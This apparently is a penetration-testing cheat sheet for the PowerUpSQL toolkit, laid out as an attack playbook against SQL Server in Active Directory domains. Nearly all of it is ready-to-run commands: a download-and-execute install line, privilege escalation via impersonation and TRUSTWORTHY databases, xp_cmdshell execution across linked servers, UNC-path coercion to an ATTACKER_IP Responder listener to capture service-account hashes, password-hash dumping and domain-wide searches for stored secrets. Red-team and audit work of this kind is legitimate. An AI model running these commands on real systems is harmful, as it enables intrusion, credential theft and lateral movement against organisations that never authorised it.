# PowerUpSQL

**Tags:** `#powerupsql` `#mssql` `#sqlserver` `#activedirectory` `#postexploitation` `#privesc` `#windows` `#powershell`

PowerShell toolkit for MSSQL auditing and exploitation in Active Directory environments. Discovers SQL Server instances across the domain via SPNs, tests access with current credentials, audits configurations, and chains linked server attacks for privilege escalation. Essential for SQL Server privilege escalation paths in AD environments.

**Source:** https://github.com/NetSPI/PowerUpSQL
**Install:** `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')` or import from local clone

```powershell
# Import
Import-Module .\PowerUpSQL.ps1

# Find and test all SQL instances in the domain
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded
```

> [!note] **PowerUpSQL vs mssqlclient** — PowerUpSQL runs on a Windows foothold inside the domain — it uses domain SPN enumeration to discover SQL instances and tests access with the current user's token automatically. mssqlclient is for Linux-based targeted exploitation once you already know the target. Use PowerUpSQL for discovery and domain-wide SQL privilege escalation chains.

---

## Discovery — Finding SQL Instances

```powershell
# Find all SQL Server SPNs in the domain (unauthenticated domain query)
Get-SQLInstanceDomain

# Find instances and test connectivity with current user
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded

# Find instances accessible to current user (non-public access)
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"}

# Scan local subnet for SQL instances (no domain required)
Get-SQLInstanceScanUDP -ComputerName 192.168.1.0/24

# Check a specific instance
Get-SQLConnectionTest -Instance "MSSQL01\SQLEXPRESS"
```

---

## Reconnaissance

```powershell
# Server info
Get-SQLServerInfo -Instance "MSSQL01"

# All databases
Get-SQLDatabase -Instance "MSSQL01"

# All tables in a database
Get-SQLTable -Instance "MSSQL01" -DatabaseName "targetdb"

# All columns
Get-SQLColumn -Instance "MSSQL01" -DatabaseName "targetdb" -TableName "users"

# Search columns by keyword (find password fields)
Get-SQLColumn -Instance "MSSQL01" -DatabaseName "targetdb" -ColumnNameSearch "pass"
Get-SQLColumn -Instance "MSSQL01" -DatabaseName "targetdb" -ColumnNameSearch "cred"
Get-SQLColumn -Instance "MSSQL01" -DatabaseName "targetdb" -ColumnNameSearch "secret"

# Dump data from a specific table
Get-SQLQuery -Instance "MSSQL01" -Query "SELECT * FROM targetdb.dbo.users"

# List all logins
Get-SQLServerLogin -Instance "MSSQL01"

# List sysadmin accounts
Get-SQLServerRoleMember -Instance "MSSQL01" -RolePrincipalName "sysadmin"
```

---

## Privilege Check & Escalation

```powershell
# Check current user's privileges
Get-SQLServerPriv -Instance "MSSQL01"

# Check for impersonatable logins
Invoke-SQLAuditPrivImpersonateLogin -Instance "MSSQL01" -Verbose

# Exploit login impersonation → escalate to sysadmin
Invoke-SQLAuditPrivImpersonateLogin -Instance "MSSQL01" -Exploit -Verbose

# Check for TRUSTWORTHY databases (db_owner → sysadmin path)
Invoke-SQLAuditPrivTrustworthy -Instance "MSSQL01" -Verbose
Invoke-SQLAuditPrivTrustworthy -Instance "MSSQL01" -Exploit -Verbose

# Full privilege audit (checks every known privesc path, incl. xp_cmdshell usability)
Invoke-SQLAudit -Instance "MSSQL01" -Verbose

# There is NO Invoke-SQLAuditPrivXpCmdshell. For xp_cmdshell, Invoke-SQLAudit flags it and
# Invoke-SQLOSCmd auto-enables it if you're sysadmin (see OS Command Execution below).
# The real UNC-coercion audit primitives (force SQL to auth out) are:
Invoke-SQLAuditPrivXpDirtree  -Instance "MSSQL01" -Verbose
Invoke-SQLAuditPrivXpFileexist -Instance "MSSQL01" -Verbose
```

---

## OS Command Execution

```powershell
# Execute OS command via xp_cmdshell (requires sysadmin)
Invoke-SQLOSCmd -Instance "MSSQL01" -Command "whoami" -Verbose

# Run on all accessible domain instances
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded |
  Where-Object {$_.Status -eq "Accessible"} |
  Invoke-SQLOSCmd -Command "whoami"

# Enable xp_cmdshell manually
Get-SQLQuery -Instance "MSSQL01" -Query "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
```

---

## Linked Server Enumeration & Attack

```powershell
# Find linked servers for a given instance
Get-SQLServerLink -Instance "MSSQL01" -Verbose

# Crawl all linked server chains from accessible instances
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded |
  Where-Object {$_.Status -eq "Accessible"} |
  Get-SQLServerLinkCrawl -Verbose

# Execute query across linked server chain
Get-SQLServerLinkCrawl -Instance "MSSQL01" -Query "SELECT @@version" -Verbose

# OS command via linked server chain (if sysadmin at end of chain)
Get-SQLServerLinkCrawl -Instance "MSSQL01" -Query "EXEC xp_cmdshell 'whoami'" -Verbose

# Direct linked server query
Get-SQLQuery -Instance "MSSQL01" -Query "EXEC ('xp_cmdshell ''whoami''') AT [MSSQL02]"
```

---

## Credential Capture — UNC Path Coercion

```powershell
# Force SQL Server to authenticate to your Responder/ntlmrelayx listener and capture the
# service-account hash. The real function is Invoke-SQLUncPathInjection
# (Get-SQLServiceAccountPwHashes does not exist):
Invoke-SQLUncPathInjection -Instance "MSSQL01" -CaptureIp ATTACKER_IP -Verbose

# Enumerate the SQL service account, and dump stored SQL login password hashes (sysadmin):
Get-SQLServiceAccount -Instance "MSSQL01"
Get-SQLServerPasswordHash -Instance "MSSQL01" -Verbose
```

```bash
# Kali side — catch with Responder
sudo responder -I tun0
```

---

## Database Content Search

```powershell
# Search all accessible instances for tables containing keywords
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded |
  Where-Object {$_.Status -eq "Accessible"} |
  Get-SQLColumnSampleDataThreaded -Keywords "password,credential,secret,key,token" -Verbose

# Search specific instance
Get-SQLColumnSampleData -Instance "MSSQL01" -Keywords "password" -Verbose -SampleSize 5
```

---

## Full Domain Audit One-Liner

```powershell
# Discover, test, and audit all domain SQL instances
Get-SQLInstanceDomain |
  Get-SQLConnectionTestThreaded -Verbose |
  Where-Object {$_.Status -eq "Accessible"} |
  Invoke-SQLAudit -Verbose |
  Out-GridView
```

---

## OPSEC Notes

- SPN enumeration via LDAP — generates standard domain LDAP queries, low noise
- Connection tests generate SQL Server audit events and Windows auth events on each target
- `xp_cmdshell` commands logged in SQL Server error logs and Windows Application event log
- Linked server crawl hits multiple SQL instances — generates auth events across hosts

---

> [!note] **See also** — the Linux/targeted counterpart is [[Tools/Database/mssqlclient|mssqlclient]] (impacket) once you know the instance; service reference [[Services/Database Services/MSSQL|MSSQL]]. Catch the `Invoke-SQLUncPathInjection` coercion with Responder/[[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]], and crack `Get-SQLServerPasswordHash` output with [[Tools/Auth/hashcat|hashcat]].

---

*Created: 2026-03-06*
*Updated: 2026-08-27*
*Model: claude-opus-5*
